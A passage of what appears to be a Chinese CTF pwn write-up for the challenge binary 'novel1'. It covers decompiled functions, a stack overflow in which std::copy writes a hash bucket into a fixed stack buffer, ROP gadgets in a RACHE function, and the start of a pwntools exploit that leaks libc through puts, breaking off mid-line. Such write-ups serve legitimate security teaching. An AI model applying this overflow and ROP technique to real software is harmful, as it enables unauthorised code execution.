+<h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778047416619-def570df-3998-43a4-8f24-5abb465ff5c5-866104.png" alt="1778047416619-def570df-3998-43a4-8f24-5abb465ff5c5.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">part1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">    _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">    _QWORD p_n3[<span class="number">6</span>]; <span class="comment">// [rsp+Ch] [rbp-84h] BYREF</span></span><br><span class="line">    _BYTE v4[<span class="number">9</span>]; <span class="comment">// [rsp+3Fh] [rbp-51h] BYREF</span></span><br><span class="line">    __int64 v5; <span class="comment">// [rsp+48h] [rbp-48h] BYREF</span></span><br><span class="line">    _QWORD p_p_n3[<span class="number">5</span>]; <span class="comment">// [rsp+50h] [rbp-40h] BYREF</span></span><br><span class="line">    __int64 v7; <span class="comment">// [rsp+7Fh] [rbp-11h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)<span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::size(&amp;bloodstains) &gt; <span class="number">0x1F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v4);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;((<span class="type">char</span> *)p_n3 + <span class="number">4</span>, <span class="string">&quot;All the bloodstains have been collected.&quot;</span>, v4);</span><br><span class="line">        fragment((<span class="type">char</span> *)p_n3 + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, p_n3);</span><br><span class="line">    *(_QWORD *)&amp;v4[<span class="number">1</span>] = <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::end(&amp;bloodstains);</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::find(&amp;bloodstains, p_n3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::__detail::operator!=(&amp;v5, &amp;v4[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(p_p_n3, <span class="string">&quot;This bloodstain has been found.&quot;</span>, &amp;v7);</span><br><span class="line">        fragment(p_p_n3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v2);</span><br><span class="line">    v0 = v2;</span><br><span class="line">    result = (_QWORD *)<span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::operator[](&amp;bloodstains, p_n3);</span><br><span class="line">    *result = v0;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span>* <span class="title">part1</span><span class="params">()</span> </span>&#123;        <span class="comment">// 假设 p_n3 是 key (血迹编号)，v2 是 value (血迹内容/地址/大小)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bloodstains.<span class="built_in">size</span>() &gt; <span class="number">31</span>) &#123;   <span class="comment">// 检查容量上限 (最多记录 32 个血迹，0x1F = 31)</span></span><br><span class="line">        <span class="built_in">fragment</span>(<span class="string">&quot;All the bloodstains have been collected.&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; key;     <span class="comment">// 提示并输入 Key (血迹编号)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bloodstains.<span class="built_in">find</span>(key) != bloodstains.<span class="built_in">end</span>()) &#123;     <span class="comment">// 检查是否重复</span></span><br><span class="line">        <span class="built_in">fragment</span>(<span class="string">&quot;This bloodstain has been found.&quot;</span>);      <span class="comment">// 不能覆盖已有的记录</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; value;</span><br><span class="line">    bloodstains[key] = value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回刚存入的数据的内存地址</span></span><br><span class="line">    <span class="keyword">return</span> &amp;bloodstains[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>part1 函数相当于 add，检查 blood 的个数不可以超过 0x1F，然后输入 blood_index，进行一系列检测，</p>
+<p>通过 find 操作防止重复。</p>
+<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778048658399-9f7c6ed7-54dc-4c3e-a491-ff45194b7060-636073.png" alt="1778048658399-9f7c6ed7-54dc-4c3e-a491-ff45194b7060.png"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">part2</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> buf[<span class="number">39</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  _DWORD p_n3[<span class="number">3</span>]; <span class="comment">// [rsp+9Ch] [rbp-A4h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+A8h] [rbp-98h] BYREF</span></span><br><span class="line">  _QWORD p_p_n3[<span class="number">5</span>]; <span class="comment">// [rsp+B0h] [rbp-90h] BYREF</span></span><br><span class="line">  _QWORD v7[<span class="number">4</span>]; <span class="comment">// [rsp+DFh] [rbp-61h] BYREF</span></span><br><span class="line">  _QWORD v8[<span class="number">3</span>]; <span class="comment">// [rsp+100h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+118h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+120h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x90u</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, p_n3);    <span class="comment">// cin &gt;&gt; p_n3</span></span><br><span class="line">  *(_QWORD *)&amp;p_n3[<span class="number">1</span>] = std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">end</span>(&amp;bloodstains);<span class="comment">// 获取哈希表的“尾后迭代器”（即表示结束的标志），并把它存放在栈上的一个局部变量里。</span></span><br><span class="line">  v5 = std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">find</span>(&amp;bloodstains, p_n3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)std::__detail::<span class="keyword">operator</span>==(&amp;v5, &amp;p_n3[<span class="number">1</span>]) )<span class="comment">// if (bloodstains.find(key) == bloodstains.end())</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">    std::string::basic_string&lt;std::allocator&lt;<span class="type">char</span>&gt;&gt;(p_p_n3, <span class="string">&quot;This bloodstain has not been found.&quot;</span>, v7);</span><br><span class="line">    <span class="built_in">fragment</span>((__int64)p_p_n3);                  <span class="comment">// fragment</span></span><br><span class="line">  &#125;</span><br><span class="line">  v10 = std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">bucket</span>(&amp;bloodstains, p_n3);<span class="comment">// bucket索引</span></span><br><span class="line">  v9 = std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">bucket_size</span>(&amp;bloodstains, v10);<span class="comment">// bucket_size 一共有多少个元素</span></span><br><span class="line">  std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">end</span>((<span class="type">char</span> *)v7 + <span class="number">1</span>, &amp;bloodstains, v10);<span class="comment">// 哈希桶结尾迭代器</span></span><br><span class="line">  std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;::<span class="built_in">begin</span>(v8, &amp;bloodstains, v10);<span class="comment">// 哈希桶开始迭代器</span></span><br><span class="line">  std::copy&lt;std::__detail::_Local_iterator&lt;<span class="type">unsigned</span> <span class="type">int</span>,std::pair&lt;<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;,std::__detail::_Select1st,std::hash&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;,std::__detail::_Mod_range_hashing,std::__detail::_Default_ranged_hash,<span class="literal">false</span>,<span class="literal">false</span>&gt;,std::pair*&lt;<span class="type">unsigned</span> <span class="type">int</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;&gt;(</span><br><span class="line">    v8,</span><br><span class="line">    (<span class="type">char</span> *)v7 + <span class="number">1</span>,                             <span class="comment">// std::copy(bucket_begin, bucket_end, buf); 将哈希桶所有元素拷贝到buf当中</span></span><br><span class="line">    buf);</span><br><span class="line">  std::__detail::_Local_iterator&lt;<span class="type">unsigned</span> <span class="type">int</span>,std::pair&lt;<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;,std::__detail::_Select1st,std::hash&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;,std::__detail::_Mod_range_hashing,std::__detail::_Default_ranged_hash,<span class="literal">false</span>,<span class="literal">false</span>&gt;::~_Local_iterator(v8);</span><br><span class="line">  std::__detail::_Local_iterator&lt;<span class="type">unsigned</span> <span class="type">int</span>,std::pair&lt;<span class="type">unsigned</span> <span class="type">int</span> <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">long</span>&gt;,std::__detail::_Select1st,std::hash&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;,std::__detail::_Mod_range_hashing,std::__detail::_Default_ranged_hash,<span class="literal">false</span>,<span class="literal">false</span>&gt;::~_Local_iterator((<span class="type">char</span> *)v7 + <span class="number">1</span>);<span class="comment">// ~ 清理</span></span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);<span class="comment">// cout &lt;&lt; endl</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )                          <span class="comment">// for(int i = 0;i &gt;= v9; ++i)</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v9 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, buf[<span class="number">0</span>]);<span class="comment">// count &lt;&lt; buf[i] &lt;&lt; endl</span></span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">part2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 栈上的一个固定大小的局部数组 (0x90 = 144 字节)</span></span><br><span class="line">    std::pair&lt;<span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>&gt; buf[<span class="number">9</span>]; </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x90</span>); </span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key;</span><br><span class="line">    <span class="comment">// 1. 输入你要查找的血迹编号 (Key)</span></span><br><span class="line">    std::cin &gt;&gt; key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查这个 Key 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (bloodstains.<span class="built_in">find</span>(key) == bloodstains.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="built_in">fragment</span>(<span class="string">&quot;This bloodstain has not been found.&quot;</span>); <span class="comment">// 找不到就报错</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 获取这个 Key 所在的哈希桶 (Bucket) 的索引</span></span><br><span class="line">    <span class="type">size_t</span> bucket_idx = bloodstains.<span class="built_in">bucket</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取这个哈希桶里一共有多少个元素</span></span><br><span class="line">    <span class="type">size_t</span> bucket_sz = bloodstains.<span class="built_in">bucket_size</span>(bucket_idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 获取这个哈希桶的开头和结尾迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> bucket_begin = bloodstains.<span class="built_in">begin</span>(bucket_idx);</span><br><span class="line">    <span class="keyword">auto</span> bucket_end = bloodstains.<span class="built_in">end</span>(bucket_idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 将整个哈希桶里的所有元素，拷贝到栈上的局部数组 buf 中</span></span><br><span class="line">    std::<span class="built_in">copy</span>(bucket_begin, bucket_end, buf);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 7. 打印出来 (反编译器这里识别得有些问题，原意应该是遍历打印 key)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; bucket_sz; ++i) &#123;</span><br><span class="line">        std::cout &lt;&lt; buf[i].first &lt;&lt; std::endl; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket_sz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="哈希桶-Bucket-的概念"><a href="#哈希桶-Bucket-的概念" class="headerlink" title="哈希桶 (Bucket) 的概念"></a>哈希桶 (Bucket) 的概念</h5><p>在前面我们提到过，<code>std::unordered_map</code> 的底层是哈希表。</p>
+<p>当你把一个 Key 存进去时，C++ 会计算它的哈希值，然后把它放进对应的桶（Bucket）里。</p>
+<ul>
+<li>如果两个不同的 Key 算出来的哈希值一样，或者对桶的数量取模后一样，它们就会被放进同一个桶里。这在计算机科学中叫哈希碰撞 。</li>
+<li>C++ 的处理方式是：把同一个桶里的元素用一个链表串起来。</li>
+</ul>
+<p>代码中的 <code>std::unordered_map::bucket</code> 就是用来找某个 Key 在哪个桶里；<code>bucket_size</code> 就是看这个桶里串了多少个元素。</p>
+<h5 id="致命的-std-copy-操作"><a href="#致命的-std-copy-操作" class="headerlink" title="致命的 std::copy 操作"></a>致命的 std::copy 操作</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="built_in">copy</span>&lt;...&gt;(v8, (<span class="type">char</span> *)v7 + <span class="number">1</span>, buf);</span><br></pre></td></tr></table></figure>
+
+<p>这对应的就是 <code>std::copy(begin, end, buf)</code>,把指定桶里的所有键值对，全部复制到 <code>buf</code> 这个栈变量里。</p>
+<hr>
+<p>我们继续堆 part2 分析：这个 part2 函数在最后调用了 cout &lt;&lt; buf ,相当于 show。由于 memset 和 copy 操作都是针对于 v3 的，因此我们猜测 v3 有漏洞</p>
+<h4 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h4><p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778048588349-89f39e5a-1cc9-4402-84dd-cfa1eda5c10a-397898.png" alt="1778048588349-89f39e5a-1cc9-4402-84dd-cfa1eda5c10a.png"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">epilogue</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="RACHE"><a href="#RACHE" class="headerlink" title="RACHE"></a><font style="color:rgb(77, 77, 77);">RACHE</font></h4><p>除此之外，还存在着一个 RACHE 函数，里面有很多 pop 可以当做 gadgets 进行利用：</p>
+<p><img src="/HFTTC.github.io/images/pwn/1MXn88zcULbR6Hzz/1778064750694-69e84df6-540b-44f0-a7c7-0b8ebac371c2-591915.png" alt="1778064750694-69e84df6-540b-44f0-a7c7-0b8ebac371c2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004025B6 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004025B6</span><br><span class="line">.text:00000000004025B6 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000004025B6</span><br><span class="line">.text:00000000004025B6 ; __int64 RACHE(void)</span><br><span class="line">.text:00000000004025B6                 public _Z5RACHEv</span><br><span class="line">.text:00000000004025B6 _Z5RACHEv       proc near</span><br><span class="line">.text:00000000004025B6 ; __unwind &#123;</span><br><span class="line">.text:00000000004025B6                 endbr64</span><br><span class="line">.text:00000000004025BA                 push    rbp</span><br><span class="line">.text:00000000004025BB                 mov     rbp, rsp</span><br><span class="line">.text:00000000004025BE                 pop     rax</span><br><span class="line">.text:00000000004025BF                 pop     rsp</span><br><span class="line">.text:00000000004025C0                 pop     rdi</span><br><span class="line">.text:00000000004025C1                 nop</span><br><span class="line">.text:00000000004025C2                 pop     rbp</span><br><span class="line">.text:00000000004025C3                 retn</span><br><span class="line">.text:00000000004025C3 ; &#125; // starts at 4025B6</span><br><span class="line">.text:00000000004025C3 _Z5RACHEv       endp ; sp-analysis failed</span><br><span class="line">.text:00000000004025C3</span><br><span class="line">.text:00000000004025C4</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">接下来我们去动调，看一看栈上的情况：</font></p>
+<p><font style="color:rgb(77, 77, 77);">EXP：</font></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./novel1&#x27;</span></span><br><span class="line">p = <span class="built_in">process</span>(filename)</span><br><span class="line"></span><br><span class="line">elf = <span class="built_in">ELF</span>(filename)</span><br><span class="line"></span><br><span class="line">ld_path = <span class="string">&quot;/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;</span></span><br><span class="line">libc = <span class="built_in">ELF</span>(<span class="string">&#x27;/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = <span class="built_in">process</span>([ld_path, <span class="string">&quot;./novel1&quot;</span>], env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>: <span class="string">&quot;/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">context</span>(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x0000000000402460</span></span><br><span class="line">puts_got = <span class="number">0x000000000040A108</span></span><br><span class="line">pop_rax_rsp_rdi_rbp_ret = <span class="number">0x0000000004025BE</span></span><br><span class="line">main = <span class="number">0x0000000000402D23</span></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">part1</span>(idx,value):</span><br><span class="line">    p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).<span class="built_in">encode</span>())</span><br><span class="line">    p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Evidence:&quot;</span>,<span class="built_in">str</span>(value).<span class="built_in">encode</span>())</span><br><span class="line">    </span><br><span class="line">def <span class="built_in">part2</span>(idx):</span><br><span class="line">    p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.<span class="built_in">sendlineafter</span>(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).<span class="built_in">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="built_in">get_addr</span>(p):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">author = <span class="number">0x000000000040A540</span></span><br><span class="line">rop = <span class="built_in">p64</span>(puts_got)+<span class="built_in">p64</span>(<span 